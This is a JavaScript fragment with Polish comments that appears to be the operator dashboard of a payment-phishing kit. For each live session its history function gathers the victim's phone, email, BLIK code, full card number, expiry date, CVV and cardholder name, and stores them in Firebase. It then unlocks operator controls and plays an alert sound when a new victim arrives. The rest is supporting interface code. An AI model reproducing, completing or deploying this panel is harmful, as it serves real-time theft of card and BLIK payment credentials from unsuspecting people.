// Opróżnij bufor historii który mógł się wypełnić zanim DOM był gotowy
if (window._historyBuf && window._historyBuf.length) {
  window._historyBuf.forEach(e => e && e.hid && renderHistItem(e));
  window._historyBuf = [];
}

function addToHistory(sid, confirmMsg, ts) {
  const u = users[sid];
  if (!u) return;

  const isBlik = confirmMsg && confirmMsg.includes('BLIK');
  const hid = 'h_' + sid + '_' + Date.now();

  const entry = {
    hid,
    sid,
    userName: u.name,
    method:   isBlik ? 'BLIK' : 'Karta',
    confirm:  (confirmMsg || '') + ts,
    ts:       Date.now(),
    phone:    document.getElementById(sid + '-phone')?.textContent    || '–',
    email:    document.getElementById(sid + '-email')?.textContent    || '–',
    pay:      document.getElementById(sid + '-pay')?.textContent      || '–',
    discount: document.getElementById(sid + '-discount')?.textContent || '–',
    total:    document.getElementById(sid + '-total')?.textContent    || '–',
    blik:     document.getElementById(sid + '-blik')?.textContent     || '–',
    cardnum:  document.getElementById(sid + '-cardnum')?.textContent  || '–',
    cardexp:  document.getElementById(sid + '-cardexp')?.textContent  || '–',
    cardcvv:  document.getElementById(sid + '-cardcvv')?.textContent  || '–',
    cardname: document.getElementById(sid + '-cardname')?.textContent || '–',
  };

  // Zapisz do Firebase — przetrwa odświeżenie
  window._fbSaveHistory && window._fbSaveHistory(hid, entry);

  renderHistItem(entry);
  unlockCtrl(sid, isBlik ? 'blik' : 'card');
}

function toggleHist(hid) {
  const hdr  = document.querySelector('#hist-' + hid + ' .hist-header');
  const body = document.getElementById('hbody-' + hid);
  const chev = document.getElementById('hchev-' + hid);
  const open = body.classList.contains('open');
  body.classList.toggle('open', !open);
  hdr.classList.toggle('open', !open);
  chev.classList.toggle('open', !open);
}

function deleteHist(hid) {
  const el = document.getElementById('hist-' + hid);
  if (el) el.remove();
  renderedHistIds.delete(hid);
  // Usuń też z Firebase
  window._fbDeleteHistory && window._fbDeleteHistory(hid);
  const cnt = document.querySelectorAll('#panel-hist .hist-item').length;
  document.getElementById('cnt-hist').textContent = cnt;
  if (cnt === 0) document.getElementById('histEmpty').style.display = '';
}

function deleteUser(sid) {
  const u = users[sid];
  if (!u) return;
  clearTimeout(u.hbTimer);
  clearInterval(u.timerInterval);
  u.block.remove();
  delete users[sid];
  updateCount();
  updateLiveCount();
  if (Object.keys(users).length === 0)
    document.getElementById('emptyState').style.display = '';
}

function now() {
  return new Date().toLocaleTimeString('pl-PL', {hour:'2-digit', minute:'2-digit', second:'2-digit'});
}

let toastTimer;
function toast(msg, color) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.style.color = color || '#e8eaf0';
  el.style.borderColor = color || '#2a2f3e';
  el.style.display = 'block';
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => el.style.display = 'none', 3500);
}

function beep(type) {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    if (type === 'arrive') {
      const o = ctx.createOscillator(), g = ctx.createGain();
      o.connect(g); g.connect(ctx.destination);
      o.frequency.setValueAtTime(660, ctx.currentTime);
      o.frequency.exponentialRampToValueAtTime(1100, ctx.currentTime + 0.2);
      g.gain.setValueAtTime(0.15, ctx.currentTime);
      g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
      o.start(); o.stop(ctx.currentTime + 0.4);
    } else {
      [0, 0.12, 0.24].forEach((d, i) => {
        const o = ctx.createOscillator(), g = ctx.createGain();
        o.connect(g); g.connect(ctx.destination);
        o.frequency.value = [550, 770, 990][i];
        g.gain.setValueAtTime(0.15, ctx.currentTime + d);
        g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + d + 0.25);
        o.start(ctx.currentTime + d); o.stop(ctx.currentTime + d + 0.25);
      });
    }
  } catch(e) {}
}
